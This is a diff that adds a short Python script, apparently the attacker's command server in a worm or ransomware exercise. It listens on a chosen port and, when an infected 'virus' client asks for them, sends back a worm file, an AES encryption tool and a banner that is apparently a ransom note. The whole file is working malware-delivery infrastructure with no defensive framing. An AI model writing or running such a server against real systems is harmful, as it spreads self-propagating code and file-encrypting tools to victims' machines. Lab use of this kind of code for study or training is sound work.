@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <Attacker port>")
+        sys.exit(1)
+
+    port = int(sys.argv[1])
+    with open("worm", "r") as f:
+        worm = f.read()
+    with open("aes-tool", "rb") as f:
+        aes_tool = f.read()
+    with open("/app/banner", "r") as f:
+        banner = f.read()
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('0.0.0.0', port))
+        s.listen(5)
+        print(f'Server Listening at: 0.0.0.0:{port}')
+    
+        while True:
+            conn, addr = s.accept()
+            with conn:
+                print(f'Connected by {addr[0]}:{addr[1]}')
+
+                indata = conn.recv(1024).decode()
+                print(f'Virus message: {indata}')
+
+                if indata == "Give me worm":
+                    outdata = worm.encode()
+                elif indata == "Give me aes-tool":
+                    outdata = aes_tool
+                elif indata == "Give me banner":
+                    outdata = banner.encode()
+
+                conn.send(outdata)
+                print('The worm has been sent to the virus')
+
+if __name__ == "__main__":
+    main()
